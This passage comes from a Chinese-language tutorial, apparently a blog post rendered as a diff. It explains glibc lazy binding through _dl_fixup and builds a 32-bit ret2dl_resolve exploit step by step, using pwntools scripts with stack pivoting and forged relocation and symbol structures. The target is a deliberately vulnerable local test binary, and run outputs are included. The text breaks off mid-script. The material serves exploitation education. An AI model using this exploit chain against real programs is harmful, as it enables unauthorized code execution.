+      <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
+        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
+      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+      <span class="token comment" spellcheck="true">// 接着通过strtab+sym->st_name找到符号表字符串</span>
+      result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span> <span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-></span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-></span>l_scope<span class="token punctuation">,</span>
+                    version<span class="token punctuation">,</span> ELF_RTYPE_CLASS_PLT<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+      <span class="token comment" spellcheck="true">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span>
+      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>result<span class="token punctuation">,</span>
+                   sym <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token function">LOOKUP_VALUE_ADDRESS</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+                      <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+      <span class="token comment" spellcheck="true">/* We already found the symbol.  The module (and therefore its load
+     address) is also known.  */</span>
+      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      result <span class="token operator">=</span> l<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+  <span class="token comment" spellcheck="true">// 最后把value写入相应的GOT表条目rel_addr中</span>
+  <span class="token keyword">return</span> <span class="token function">elf_machine_fixup_plt</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> result<span class="token punctuation">,</span> reloc<span class="token punctuation">,</span> rel_addr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>可以看到_dl_fixup函数就如上面描述的过程一般，去定位结构体，最终获取read字符串去libc中找到相应的函数地址并填回到got表中。</p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>调用函数时，call func@plt，plt表内容如下：</p>
+<pre class=" language-bash"><code class="language-bash">func@plt:
+jmp *<span class="token punctuation">(</span>func@GOT<span class="token punctuation">)</span>   //仍然首先进行GOT跳转，尝试是否是第一次链接
+push n        //压入需要地址绑定的符号在重定位表中的下标
+jmp PLT0    //跳转到 PLT0</code></pre>
+<p>由于是第一次调用，func@GOTgot表中的值为jmp *(func@GOT)指令的下一条地址，即push n的地址，接着程序会执行push n; jmp PLT0，n则为该函数在.rel.plt表中的偏移。接着去看PLT0的指令为：<br>push *(got+4)<br>jmp *(got+8)</p>
+<p>其中got+4存储的是link_map的地址，got+8存储的是_dl_runtime_resolve函数的地址。进入到_dl_runtime_resolve函数后，函数会调用_dl_fixup函数，根据源码分析，可以看到该函数功能为：</p>
+<ul>
+<li>程序先从第一个参数link_map获取字符串表.dynstr、符号表.dynsym以及重定位表.rel.plt的地址，</li>
+<li>通过第二个参数n即.rel.plt表中的偏移reloc_arg加上.rel.plt的地址获取函数对应的重定位结构的位置，从而获取函数对应的r_offset以及在符号表中的下标r_info&gt;&gt;8。</li>
+<li>根据符号表地址以及下标获取符号结构体，获得了函数符号表中的st_name，即函数名相对于字符串表.dynstr的偏移。</li>
+<li>最后可得到函数名的字符串，然后去libc中匹配函数名，找到相应的函数并将地址填回到r_offset即函数got表中，延迟绑定完成。</li>
+</ul>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>32位的ret2dl_resolve<br>原理<br>ret2dl_resolve的适用场景是在无法泄露程序地址时，通过拦截延迟绑定的过程，实现对函数地址解析过程的劫持，使得最终解析出来的函数为特定函数的函数地址，从而实现无泄露达到特定函数调用的目的。<br>32位ELF程序ret2dl_resolve攻击方法，目前最为普遍的是伪造reloc_arg，即伪造重定位表的下标实现相关的利用，具体包括如下步骤：</p>
+<ul>
+<li>伪造reloc_arg，使得reloc_arg加上.rel.plt的地址指向可控的地址，在该地址可伪造恶意的Elf32_Rel结构体。</li>
+<li>伪造Elf32_Rel结构体中的r_offset指向某一可写地址，最终函数地址会写入该地址处；伪造r_info&amp;0xff为0x7，因为类型需为ELF_MACHINE_JMP_SLOT以绕过类型验证；伪造r_info&gt;&gt;8，使得r_info&gt;&gt;8加上.dynsym地址指向可控的地址，并在该地址伪造符号表结构体Elf32_Sym。</li>
+<li>伪造Elf32_Sym结构体中的st_name，使得.dynstr的地址加上该值指向可控地址，并在该地址处写入特定函数的函数名入system。</li>
+<li>最终系统通过函数名匹配，定位到特定函数地址，获取该地址并写入到伪造的r_offset中，实现了函数地址的获取。</li>
+</ul>
+<p>需要注意一点的是dl_fixup中还存在以下一段代码：</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+   <span class="token punctuation">{</span>
+      <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
+        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
+      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>如果reloc-&gt;r_info伪造不当，会使得ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff偏大，导致version = &amp;l-&gt;l_versions[ndx]出现访存错误，因此伪造的reloc-&gt;r_info，最好使得ndx为0，即vernum[reloc-&gt;r_info]为0。</p>
+<p><img src="https://s1.ax1x.com/2020/08/17/dnQOQH.png" alt=""><br><img src="https://s1.ax1x.com/2020/08/17/dnQXyd.png" alt=""></p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token comment" spellcheck="true">//gcc -m32 -fno-stack-protecor -no-pie test2.c -o test2</span>
+<span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Welcome to the Crazy World!\n"</span><span class="token punctuation">;</span>
+
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>溢出点为：112<br>利用思路：<br>1.控制eip为PLT[0]的地址，只需传递一个index_arg参数<br>2.控制index_arg的大小，使reloc的位置落在可控地址内<br>3.伪造reloc的内容，使sym落在可控地址内<br>4.伪造sym的内容，使name落在可控地址内<br>5.伪造name为任意库函数，如system</p>
+<h3 id="step1："><a href="#step1：" class="headerlink" title="step1："></a>step1：</h3><p>直接返回到write@plt</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
+
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>
+offset <span class="token operator">=</span> <span class="token number">112</span>
+read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+
+ppp_ret <span class="token operator">=</span> <span class="token number">0x08048659</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>
+pop_ebp_ret <span class="token operator">=</span> <span class="token number">0x0804865b</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>
+leave_ret <span class="token operator">=</span> <span class="token number">0x08048465</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>
+
+stack_size <span class="token operator">=</span> <span class="token number">0x400</span>  <span class="token comment" spellcheck="true">#fake chain from bss_addr+0x400</span>
+bss_addr <span class="token operator">=</span> <span class="token number">0x0804a028</span> 
+base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size  <span class="token comment" spellcheck="true">#fake chain addr</span>
+
+r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test2'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#input fake chain </span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>ppp_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#balance the stack</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> 
+<span class="token comment" spellcheck="true">#栈迁移</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebp_ret<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#base_stage pop ==>ebp</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># mov esp, ebp ; pop ebp ;make esp==>base_stage</span>
+<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#print r.recv()</span>
+
+cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
+
+
+payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> 
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：成功调用write函数并将/bin/sh打印出来</p>
+<pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ python test2.py 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49059
+Welcome to the Crazy World<span class="token operator">!</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
+$  </code></pre>
+<h3 id="step2："><a href="#step2：" class="headerlink" title="step2："></a>step2：</h3><p>这次控制eip返回PLT[0]，要带上write的index_offset。这里修改一下payload2</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
+
+plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>
+index_offset <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token comment" spellcheck="true">#write`s index from  objump -d -j .plt test2</span>
+payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>
+<span class="token comment" spellcheck="true">#代替原来的p32(write_plt)</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> 
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span></code></pre>
+<p>结果成功调用write函数打印/bin/sh</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49114
+Welcome to the Crazy World<span class="token operator">!</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
+$  </code></pre>
+<h3 id="step3"><a href="#step3" class="headerlink" title="step3:"></a>step3:</h3><p>控制index_offset，指向我们构造的fake_reloc</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
+
+plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>
+rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>
+index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+r_info <span class="token operator">=</span> <span class="token number">0x607</span> <span class="token comment" spellcheck="true">#rel.plt of write --> r_info</span>
+fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
+
+payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> 
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> fake_reloc
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：成功调用write函数并打印/bin/sh</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49177
+Welcome to the Crazy World<span class="token operator">!</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive</code></pre>
+<h3 id="step4："><a href="#step4：" class="headerlink" title="step4："></a>step4：</h3><p>再进一步：构造fake——sym，使其指向我们控制的st_name</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
+
+plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>
+rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>
+index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>
+dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>
+fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>
+这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是<span class="token number">0x10</span>字节大小
+align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>
+fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align
+除以<span class="token number">0x10</span>因为Elf32_Sym结构体的大小为<span class="token number">0x10</span>，得到write的dynsym索引号
+index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> 
+r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>
+fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
+st_name <span class="token operator">=</span> <span class="token number">0x4c</span> <span class="token comment" spellcheck="true">#在synstr中的偏移</span>
+fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>
+
+payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>
